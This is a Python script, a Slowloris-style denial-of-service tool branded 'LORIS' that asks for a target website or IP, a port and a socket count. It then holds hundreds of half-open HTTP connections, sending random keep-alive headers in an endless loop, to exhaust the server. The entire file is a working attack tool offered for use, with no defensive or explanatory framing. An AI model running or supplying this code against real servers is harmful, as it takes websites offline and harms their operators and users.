import socket
from random import randint
from time import sleep
import os
import time


REGULAR_HEADERS = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]
message = """
88      dP"Yb  88""Yb 88 .dP"Y8 
88     dP   Yb 88__dP 88 `Ybo." 
88  .o Yb   dP 88"Yb  88 o.`Y8b 
88ood8  YbodP  88  Yb 88 8bodP' 
 """
os.system("color 0a")
print 'Tested on 500 max threads per instance'
time.sleep(0.2)
print "STARTING     .....        "

print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(0.5)
print "[=======             ] 40%"
time.sleep(0.1)
print "[============        ] 60%"
time.sleep(0.4)
print "[=================   ] 85%"
time.sleep(0.35)
print "[====================] 100%"
print(message)
IPT = input('Port> 80 or 443: ')
class Sock(socket.socket):
    def __init__(self, target):
        try:
            super(Sock, self).__init__()
            self.settimeout(4)
            self.connect((target, IPT))
            self.send(("Get /?%s HTTP/1.1\r\n" % randint(0, 2000)).encode("UTF-8"))
            for header in REGULAR_HEADERS:
                self.send(("%s\r\n" % header).encode("UTF-8"))
        except:
            print("Error making socket")
            pass

    def keep_alive(self, list_of_sockets):
        try:
            self.send(("X-a: %s\r\n" % randint(0, 5000)).encode("UTF-8"))
        except socket.error:
            self.close()
            list_of_sockets.remove(self)

def recreate_sockets(list_of_sockets, max_sockets, target):
    for index in range(max_sockets - len(list_of_sockets)):
        list_of_sockets.append(Sock(target))

def attack(list_of_sockets, max_sockets, target):
    while True:
        print("-----Attacking %s with %s sockets-----" %(target, len(list_of_sockets))) # Printing this every time just in case some sockets die or are made
        for sock in list_of_sockets:
            try:
                sock.keep_alive(list_of_sockets)
            except socket.error():
                print("Error keeping alive")
                pass
        recreate_sockets(list_of_sockets, max_sockets, target)
        sleep(0.1)
def make_sockets(max_sockets, target):
    print("Making sockets...")
    list_of_sockets = []
    for index in range(max_sockets):
        try:
            list_of_sockets.append(Sock(target))
            print("Socket successfully made [%s]" % str(index))
        except Exception as exception:
            print(exception)
            print("Error making socket")
            pass
    return list_of_sockets

def main():
    target = raw_input("Website or IP> www.test.com or 1.1.1.1: ") # The target website for the attack
    try:
        max_sockets = input('Max sockets> 500 to....: ')
        list_of_sockets = make_sockets(max_sockets, target)
        attack(list_of_sockets, max_sockets, target)
    except:
        print("Error: Max number of sockets is invalid")

if __name__ == "__main__":
    main()